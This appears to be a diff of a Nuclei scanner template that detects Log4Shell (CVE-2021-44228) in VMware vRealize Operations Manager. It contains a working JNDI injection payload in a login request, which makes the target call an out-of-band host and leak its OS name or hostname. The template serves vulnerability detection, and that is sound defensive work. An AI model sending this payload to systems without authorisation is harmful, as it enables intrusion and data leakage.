@@ -14,19 +14,12 @@ info:
     cvss-score: 10
     cve-id: CVE-2021-44228
     cwe-id: CWE-77
-    cpe: cpe:2.3:a:vmware:vrealize_operations_manager:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
-    max-request: 1
     shodan-query: title:"vRealize Operations Manager"
-    product: vrealize_operations_manager
-    vendor: vmware
+    verified: "true"
   tags: cve,cve2021,rce,jndi,log4j,vmware,kev,oast
-variables:
-  rand1: '{{rand_int(111, 999)}}'
-  rand2: '{{rand_int(111, 999)}}'
 
-http:
+requests:
   - raw:
       - |
         POST /ui/login.action HTTP/1.1
@@ -39,39 +32,32 @@ http:
         Sec-Fetch-Mode: cors
         Sec-Fetch-Site: same-origin
 
-        mainAction=login&userName=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}&password=admin&authSourceId=localItem&authSourceName=Local%20Users&authSourceType=LOCAL&forceLogin=&timezone=330&languageCode=us
+        mainAction=login&userName=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}&password=admin&authSourceId=localItem&authSourceName=Local%20Users&authSourceType=LOCAL&forceLogin=&timezone=330&languageCode=us
 
     matchers-condition: and
     matchers:
       - type: word
-        part: interactsh_protocol # Confirms the DNS Interaction
+        part: interactsh_protocol  # Confirms the DNS Interaction
         words:
           - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+'  # Match for extracted ${sys:os.name} variable
 
       - type: word
         part: header
         words:
           - 'Path=/ui'
 
-      - type: regex
-        part: interactsh_request
-        regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-
     extractors:
       - type: kval
         kval:
-          - interactsh_ip
-
-      - type: regex
-        part: interactsh_request
-        group: 2
-        regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+          - interactsh_ip # Print remote interaction IP in output
 
       - type: regex
         part: interactsh_request
         group: 1
         regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-# digest: 4a0a004730450220529d44c3600ebb232bd96eb2b1ee6d8dc2b5d6a1b53eb82d288eb36c95762868022100f61d5e2cb996bdb62d91108ab5d1a4671df50fdd326a5809cceba3051526a116:922c64590222798bb761d5b6d8e72950
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Print extracted ${sys:os.name} in output
